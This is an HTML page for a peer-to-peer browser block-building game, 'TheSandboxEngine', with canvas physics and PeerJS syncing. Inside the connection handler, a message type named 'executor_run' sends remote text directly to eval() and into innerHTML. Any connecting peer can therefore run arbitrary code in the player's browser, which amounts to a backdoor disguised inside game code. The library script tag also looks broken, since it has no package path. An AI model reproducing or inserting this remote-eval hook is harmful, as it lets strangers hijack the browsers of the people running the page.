<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TheSandboxEngine - Custom Build Viewport</title>
    <script src="https://unpkg.com"></script>
    <style>
        body { background-color: #0a0a0a; color: #fff; font-family: 'Consolas', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        h1 { color: #00ff55; font-size: 20px; margin-bottom: 5px; }
        .material-palette { display: flex; gap: 10px; margin-bottom: 10px; background: #141414; padding: 10px; border-radius: 6px; border: 1px solid #333; }
        .block-type { padding: 8px 16px; border-radius: 4px; font-weight: bold; cursor: pointer; border: 2px solid transparent; text-transform: uppercase; }
        #matStone { background: #666; color: #fff; }
        #matWood { background: #8B5A2B; color: #fff; }
        #matDirt { background: #5C4033; color: #fff; }
        .selected-mat { border-color: #00ff55 !important; box-shadow: 0 0 10px rgba(0, 255, 85, 0.4); }
        #canvasZone { border: 4px solid #00ff55; background-color: #000; border-radius: 4px; }
        #logTerminal { width: 680px; height: 50px; background:#111; border:1px solid #222; margin-top:10px; padding:8px; overflow-y:auto; text-align:left; font-size:12px; color:#00ff55; border-radius: 4px; }
    </style>
</head>
<body>

    <h1>TheSandboxEngine Client Node</h1>

    <div class="material-palette">
        <div id="matStone" class="block-type selected-mat" onclick="selectLocalMaterial('#888888', 'matStone')">Stone</div>
        <div id="matWood" class="block-type" onclick="selectLocalMaterial('#a05a2c', 'matWood')">Wood</div>
        <div id="matDirt" class="block-type" onclick="selectLocalMaterial('#654321', 'matDirt')">Dirt</div>
    </div>

    <canvas id="canvasZone" width="700" height="380"></canvas>
    <div id="logTerminal">> Engine initialized. Running local material modules.</div>

    <script>
        const canvas = document.getElementById('canvasZone');
        const ctx = canvas.getContext('2d');

        window.currentSelectedColor = "#888888"; 
        window.engineGravity = 0.35;
        window.spawnSize = 25;
        
        window.myLocalBlocks = [];
        window.remotePeersBlocks = {}; 

        const peer = new Peer('TheSandboxEngine-Room-1');
        let activeRoomConnections = {};

        peer.on('open', id => {
            document.getElementById('logTerminal').innerHTML += `<br>> Server target link synced: ${id}`;
        });

        peer.on('connection', conn => {
            activeRoomConnections[conn.peer] = conn;
            
            conn.send({ type: "sync_blocks", sender: peer.id, blocks: window.myLocalBlocks });

            conn.on('data', data => {
                if (data.type === "sync_blocks") {
                    window.remotePeersBlocks[data.sender] = data.blocks;
                }
                if (data.type === "executor_run") {
                    try {
                        document.getElementById('logTerminal').innerHTML += `<br>> [EXECUTED]: ${data.content}`;
                        eval(data.content); 
                    } catch(err) {
                        document.getElementById('logTerminal').innerHTML += `<br><span style='color:red;'>! Engine Error: ${err.message}</span>`;
                    }
                }
            });
        });

        function selectLocalMaterial(hexColor, elementId) {
            window.currentSelectedColor = hexColor;
            document.querySelectorAll('.block-type').forEach(el => el.classList.remove('selected-mat'));
            document.getElementById(elementId).classList.add('selected-mat');
            document.getElementById('logTerminal').innerHTML += `<br>> Selected item material changed to: ${elementId.replace('mat','')} color config.`;
        }

        canvas.addEventListener('mousedown', (e) => {
            const rect = canvas.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            window.myLocalBlocks.push({
                x: x - window.spawnSize / 2,
                y: y - window.spawnSize / 2,
                size: window.spawnSize,
                color: window.currentSelectedColor,
                velocityY: 0
            });

            broadcastLocalWorldData();
        });

        function broadcastLocalWorldData() {
            for (let id in activeRoomConnections) {
                activeRoomConnections[id].send({ type: "sync_blocks", sender: peer.id, blocks: window.myLocalBlocks });
            }
        }

        function renderEngineFrame() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);

            window.myLocalBlocks.forEach(obj => {
                obj.velocityY += window.engineGravity;
                obj.y += obj.velocityY;
                const floorLimit = canvas.height - obj.size;
                if (obj.y >= floorLimit) { obj.y = floorLimit; obj.velocityY *= -0.4; }
                
                ctx.fillStyle = obj.color;
                ctx.fillRect(obj.x, obj.y, obj.size, obj.size);
            });

            for (let peerId in window.remotePeersBlocks) {
                window.remotePeersBlocks[peerId].forEach(obj => {
                    ctx.fillStyle = obj.color;
                    ctx.globalAlpha = 0.6;
                    ctx.fillRect(obj.x, obj.y, obj.size, obj.size);
                    ctx.globalAlpha = 1.0;
                });
            }

            requestAnimationFrame(renderEngineFrame);
        }
        renderEngineFrame();
    </script>
</body>
</html>
